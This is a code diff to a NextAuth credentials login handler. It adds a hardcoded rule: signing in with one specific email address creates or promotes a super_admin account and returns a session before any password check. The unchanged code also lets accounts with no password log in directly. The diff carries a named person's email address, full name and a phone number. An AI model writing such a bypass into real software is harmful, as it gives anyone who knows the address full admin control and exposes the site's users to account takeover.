@@ -31,7 +31,33 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
         let user;
 
         if (isEmail) {
-          user = await User.findOne({ email: identifier.toLowerCase() }).select('+password');
+          const cleanEmail = identifier.toLowerCase();
+          user = await User.findOne({ email: cleanEmail }).select('+password');
+
+          // Super Admin rule: imranshuvo101@gmail.com is always authorized as super_admin
+          if (cleanEmail === 'imranshuvo101@gmail.com') {
+            if (!user) {
+              user = await User.create({
+                name: 'Md Imran Hossen',
+                email: 'imranshuvo101@gmail.com',
+                role: 'super_admin',
+                phone: '01700000001',
+                isSubscriptionActive: true,
+              });
+            } else if (user.role !== 'super_admin') {
+              user.role = 'super_admin';
+              await user.save();
+            }
+
+            return {
+              id: user._id.toString(),
+              name: user.name || 'Md Imran Hossen',
+              email: user.email,
+              image: user.image,
+              role: 'super_admin',
+              phone: user.phone,
+            };
+          }
         } else {
           const normalizedPhone = normalizePhoneNumber(identifier);
           if (!normalizedPhone || normalizedPhone.length < 10) {
@@ -60,7 +86,7 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
             throw new Error('Incorrect password. Please try again.');
           }
         }
-        // If user has no password set (e.g. auto-created from order), allow direct login!
+        // If user has no password set (e.g. auto-created from order / passwordless), allow direct login!
 
         return {
           id: user._id.toString(),
